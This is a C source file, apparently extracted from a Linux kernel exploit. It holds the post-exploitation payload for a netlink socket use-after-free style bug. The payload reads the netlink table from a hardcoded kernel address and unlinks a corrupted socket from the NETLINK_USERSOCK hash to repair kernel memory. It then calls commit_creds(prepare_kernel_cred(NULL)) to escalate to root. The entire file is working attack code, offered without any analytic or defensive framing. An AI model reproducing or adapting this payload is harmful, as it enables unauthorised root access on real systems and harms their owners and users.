
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_8__ TYPE_4__ ;
typedef struct TYPE_7__ TYPE_3__ ;
typedef struct TYPE_6__ TYPE_2__ ;
typedef struct TYPE_5__ TYPE_1__ ;


struct task_struct {TYPE_3__* files; } ;
struct socket {int * sk; } ;
struct nl_pid_hash {int entries; } ;
struct netlink_table {struct nl_pid_hash hash; } ;
struct hlist_node {struct hlist_node** pprev; struct hlist_node* next; } ;
struct hlist_head {struct hlist_node* first; } ;
struct TYPE_8__ {int pid; } ;
struct TYPE_7__ {TYPE_2__* fdt; } ;
struct TYPE_6__ {TYPE_1__** fd; } ;
struct TYPE_5__ {struct socket* private_data; } ;


 scalar_t__ KMALLOC_TARGET ;
 size_t NETLINK_USERSOCK ;
 scalar_t__ NL_TABLE_ADDR ;
 int commit_creds (int ) ;
 TYPE_4__ g_target ;
 struct task_struct* get_current (int ) ;
 int netlink_table_grab () ;
 int netlink_table_ungrab () ;
 struct hlist_head* nl_pid_hashfn (struct nl_pid_hash*,int ) ;
 int prepare_kernel_cred (int *) ;
 int restored_rsp ;
 size_t unblock_fd ;

__attribute__((used)) static void payload(void)
{
  struct task_struct *current = get_current(restored_rsp);
  struct socket *sock = current->files->fdt->fd[unblock_fd]->private_data;
  void *sk;

  sk = sock->sk;
  sock->sk = ((void*)0);


  netlink_table_grab();


  struct netlink_table *nl_table = * (struct netlink_table**)NL_TABLE_ADDR;
  struct nl_pid_hash *hash = &(nl_table[NETLINK_USERSOCK].hash);


  struct hlist_head *bucket = nl_pid_hashfn(hash, g_target.pid);


  struct hlist_node *cur;
  struct hlist_node **pprev = &bucket->first;
  for (cur = bucket->first; cur; pprev = &cur->next, cur = cur->next)
  {

    if (cur == (struct hlist_node*)sk)
    {

      if (cur->next == (struct hlist_node*)KMALLOC_TARGET)
        cur->next = ((void*)0);
      cur->pprev = pprev;


      *(cur->pprev) = cur->next;
      if (cur->next)
        cur->next->pprev = pprev;

      hash->entries--;


      break;
    }
  }


  netlink_table_ungrab();


  commit_creds(prepare_kernel_cred(((void*)0)));
}
